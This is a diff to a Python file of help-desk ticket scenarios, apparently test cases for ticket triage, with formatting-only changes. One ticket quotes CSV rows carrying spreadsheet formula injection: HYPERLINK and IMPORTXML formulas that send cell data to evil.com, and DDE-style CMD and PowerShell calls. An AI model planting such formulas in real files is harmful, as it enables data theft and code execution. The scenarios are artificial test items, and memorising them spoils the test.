@@ -15128,11 +15128,11 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "When we open the CSV in Excel, we get security warnings. Here are the "
                 "problematic rows:\n\n"
                 "Row 1042: =CMD('calc')!A0\n"
-                "Row 1043: =HYPERLINK(\"http://evil.com/steal?cookie=\"&A1)\n"
-                "Row 1087: +THUN(\"cmd\";\"calc\")\n"
+                'Row 1043: =HYPERLINK("http://evil.com/steal?cookie="&A1)\n'
+                'Row 1087: +THUN("cmd";"calc")\n'
                 "Row 1102: -2+1+CMD('powershell IEX(malicious)')!Z0\n"
                 "Row 1240: @SUM(1+1)*cmd|' /C calc'!A0\n"
-                "Row 1301: =IMPORTXML(CONCAT(\"http://evil.com/?data=\",A2),\"//a\")\n\n"
+                'Row 1301: =IMPORTXML(CONCAT("http://evil.com/?data=",A2),"//a")\n\n'
                 "The rest of the 5,000+ rows look normal \u2014 standard CUSIP, price, quantity "
                 "columns. We're worried this is either injection from an upstream feed or "
                 "someone tampered with the staging table.\n\n"
@@ -15224,7 +15224,13 @@ def get_scenarios() -> list[ScenarioDefinition]:
         # ── DC-223  Zalgo text with combining Unicode diacritics ────────────
         ScenarioDefinition(
             scenario_id="DC-223",
-            subject="A\u0335\u0347\u0317p\u0321\u0353\u0340p\u0334\u0326 c\u0344\u031e\u032dr\u0343\u031f\u0318a\u0308\u0352\u0348s\u0308\u032c\u0316h\u0337\u0329\u0323 on Bloomberg Terminal \u2014 URGENT",
+            subject=(
+                "A\u0335\u0347\u0317p\u0321\u0353\u0340"
+                "p\u0334\u0326 c\u0344\u031e\u032d"
+                "r\u0343\u031f\u0318a\u0308\u0352\u0348"
+                "s\u0308\u032c\u0316h\u0337\u0329\u0323"
+                " on Bloomberg Terminal \u2014 URGENT"
+            ),
             description=(
                 "H\u0336\u0349\u0320e\u0337\u0353\u032al\u0335\u032d\u0319l\u0334\u032c\u031co\u0336\u0347\u031e "
                 "I\u0335\u0329\u031fT\u0337\u0348\u0323 S\u0336\u0326\u031eu\u0334\u0353\u032dp\u0335\u032c\u0319"
@@ -15236,9 +15242,9 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "rendering engine is broken after last night's Windows Update "
                 "(KB5035942).\n\n"
                 "The error dialog said:\n"
-                "\"BLP_CORE.DLL \u2014 Unhandled exception at 0x00007FF6A1B2C3D4 in "
+                '"BLP_CORE.DLL \u2014 Unhandled exception at 0x00007FF6A1B2C3D4 in '
                 "blp_terminal.exe. Access violation reading location "
-                "0x0000000000000000\"\n\n"
+                '0x0000000000000000"\n\n'
                 "I've tried restarting the terminal 3 times. Same crash every time.\n\n"
                 "This is impacting my ability to price client trades. FX desk needs "
                 "this resolved immediately.\n\n"
@@ -15280,7 +15286,7 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "the problematic record:\n\n"
                 + '{"level_0":' * 55
                 + '{"ticker":"MSFT","price":425.67,"volume":18420000}'
-                + '}' * 55
+                + "}" * 55
                 + "\n\n"
                 "The nesting goes 55 levels deep. Our parser (Apache Spark 3.5) "
                 "defaults to a max depth of 50. This started happening after the "
@@ -15371,8 +15377,8 @@ def get_scenarios() -> list[ScenarioDefinition]:
             scenario_id="DC-226",
             subject="Service account locked out after password rotation",
             description=(
-                "Content-Type: multipart/signed; protocol=\"application/pkcs7-signature\";\n"
-                "  micalg=sha-256; boundary=\"----=_Part_5432_1234567890\"\n\n"
+                'Content-Type: multipart/signed; protocol="application/pkcs7-signature";\n'
+                '  micalg=sha-256; boundary="----=_Part_5432_1234567890"\n\n'
                 "------=_Part_5432_1234567890\n"
                 "Content-Type: text/plain; charset=UTF-8\n\n"
                 "Hi IAM team,\n\n"
@@ -15428,10 +15434,7 @@ def get_scenarios() -> list[ScenarioDefinition]:
         ScenarioDefinition(
             scenario_id="DC-227",
             subject="Excel crashes when opening Q1 risk model \u2014 macro error VBA runtime 1004",
-            description=(
-                "\n\n"
-                "Sent from my iPhone"
-            ),
+            description=("\n\nSent from my iPhone"),
             category=Category.SOFTWARE,
             priority=Priority.P3,
             team=Team.ENDPOINT,
@@ -15489,11 +15492,11 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "2026-03-18 08:00  Comment: 'Spanning tree misconfiguration suspected.'\n"
                 "---------------------------------------------------------------\n\n"
                 "Latest Comment (Li Wei, 2026-03-18 08:00):\n"
-                "\"After reviewing the logs, I suspect the new Cisco C9300-48T has a "
+                '"After reviewing the logs, I suspect the new Cisco C9300-48T has a '
                 "spanning tree priority conflict with the existing core stack. VLAN 710 "
                 "(Floor 7 data) is intermittently losing its root bridge. Need to adjust "
                 "STP priority from 32768 to 4096 on the new switch. Requesting an "
-                "emergency change window tonight.\"\n\n"
+                'emergency change window tonight."\n\n'
                 "\u2014\u2014\u2014\nThis message was automatically generated by Atlassian JIRA.\n"
                 "Do not reply to this email.\n"
                 "Manage notifications: https://jira.contoso.internal/settings/notifications"
@@ -15530,19 +15533,19 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "the registry key that keeps getting overwritten \u2014 here it is:\n\n"
                 "Windows Registry Editor Version 5.00\n\n"
                 "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy]\n"
-                "\"ProxyServer\"=\"proxy-nyc.contoso.internal:8080\"\n"
-                "\"ProxyOverride\"=\"*.contoso.internal;10.*;192.168.*;172.16.*\"\n"
-                "\"ProxyEnable\"=dword:00000001\n"
-                "\"AutoDetect\"=dword:00000000\n"
-                "\"AutoConfigURL\"=\"http://wpad.contoso.internal/wpad.dat\"\n\n"
+                '"ProxyServer"="proxy-nyc.contoso.internal:8080"\n'
+                '"ProxyOverride"="*.contoso.internal;10.*;192.168.*;172.16.*"\n'
+                '"ProxyEnable"=dword:00000001\n'
+                '"AutoDetect"=dword:00000000\n'
+                '"AutoConfigURL"="http://wpad.contoso.internal/wpad.dat"\n\n'
                 "[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Outlook\\HTTP\\Proxy\\Backup]\n"
-                "\"ProxyServer_backup\"=\"proxy-chi.contoso.internal:3128\"\n"
-                "\"ProxyEnable_backup\"=dword:00000001\n"
-                "\"LastGPORefresh\"=\"2026-03-18T08:30:00Z\"\n\n"
+                '"ProxyServer_backup"="proxy-chi.contoso.internal:3128"\n'
+                '"ProxyEnable_backup"=dword:00000001\n'
+                '"LastGPORefresh"="2026-03-18T08:30:00Z"\n\n'
                 "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Outlook\\HTTP]\n"
-                "\"ForceProxy\"=dword:00000001\n"
-                "\"MandatoryProxyServer\"=\"proxy-chi.contoso.internal:3128\"\n"
-                "\"AllowUserOverride\"=dword:00000000\n\n"
+                '"ForceProxy"=dword:00000001\n'
+                '"MandatoryProxyServer"="proxy-chi.contoso.internal:3128"\n'
+                '"AllowUserOverride"=dword:00000000\n\n'
                 "As you can see, the GPO is forcing proxy-chi (Chicago) but I'm in "
                 "the New York office and need proxy-nyc. The ForceProxy + "
                 "AllowUserOverride=0 means I can't fix this myself. My OU is "
@@ -15582,13 +15585,13 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "Hi team,\n\n"
                 "The portfolio optimizer microservice keeps crashing. Full traceback:\n\n"
                 "Traceback (most recent call last):\n"
-                "  File \"/opt/contoso/portfolio-optimizer/main.py\", line 42, in run_server\n"
+                '  File "/opt/contoso/portfolio-optimizer/main.py", line 42, in run_server\n'
                 "    result = optimizer.optimize(portfolio)\n"
-                "  File \"/opt/contoso/portfolio-optimizer/core/engine.py\", line 118, in optimize\n"
+                '  File "/opt/contoso/portfolio-optimizer/core/engine.py", line 118, in optimize\n'
                 "    return self._recursive_rebalance(holdings, constraints)\n"
                 + "".join(
                     f'  File "/opt/contoso/portfolio-optimizer/core/engine.py", line 205, in _recursive_rebalance\n'
-                    f'    return self._recursive_rebalance(sub_holdings[{i}], constraints)\n'
+                    f"    return self._recursive_rebalance(sub_holdings[{i}], constraints)\n"
                     for i in range(50)
                 )
                 + "RecursionError: maximum recursion depth exceeded while calling a Python object\n\n"
@@ -15801,7 +15804,9 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "  'vm-trade-dr-03'\n"
                 "  'vm-trade-dr-04'\n"
                 "]\n\n"
-                "resource networkInterface 'Microsoft.Network/networkInterfaces@2023-09-01' = [for (vmName, i) in vmNames: {\n"
+                "resource networkInterface"
+                " 'Microsoft.Network/networkInterfaces@2023-09-01'"
+                " = [for (vmName, i) in vmNames: {\n"
                 "  name: 'nic-$${vmName}'\n"
                 "  location: location\n"
                 "  properties: {\n"
@@ -15810,7 +15815,9 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "        name: 'ipconfig1'\n"
                 "        properties: {\n"
                 "          subnet: {\n"
-                "            id: resourceId(vnetResourceGroup, 'Microsoft.Network/virtualNetworks/subnets', 'vnet-dr-eastus2', subnetName)\n"
+                "            id: resourceId(vnetResourceGroup,"
+                " 'Microsoft.Network/virtualNetworks/subnets',"
+                " 'vnet-dr-eastus2', subnetName)\n"
                 "          }\n"
                 "          privateIPAllocationMethod: 'Dynamic'\n"
                 "        }\n"
@@ -15818,7 +15825,9 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "    ]\n"
                 "  }\n"
                 "}]\n\n"
-                "resource virtualMachine 'Microsoft.Compute/virtualMachines@2023-09-01' = [for (vmName, i) in vmNames: {\n"
+                "resource virtualMachine"
+                " 'Microsoft.Compute/virtualMachines@2023-09-01'"
+                " = [for (vmName, i) in vmNames: {\n"
                 "  name: vmName\n"
                 "  location: location\n"
                 "  properties: {\n"
@@ -15842,8 +15851,8 @@ def get_scenarios() -> list[ScenarioDefinition]:
                 "  }\n"
                 "}]\n\n"
                 "Deployment error:\n"
-                "\"code\": \"InvalidTemplateDeployment\",\n"
-                "\"message\": \"The template deployment failed with error: "
+                '"code": "InvalidTemplateDeployment",\n'
+                '"message": "The template deployment failed with error: '
                 "Subnet 'snet-trading-dr' not found in virtual network 'vnet-dr-eastus2' "
                 "in resource group 'rg-network-dr-eastus2'.\"\n\n"
                 "Correlation ID: 9f8e7d6c-5b4a-3210-fedc-ba9876543210\n\n"
@@ -15930,4 +15939,3 @@ def get_scenarios() -> list[ScenarioDefinition]:
             difficulty="medium",
         ),
     ]
-
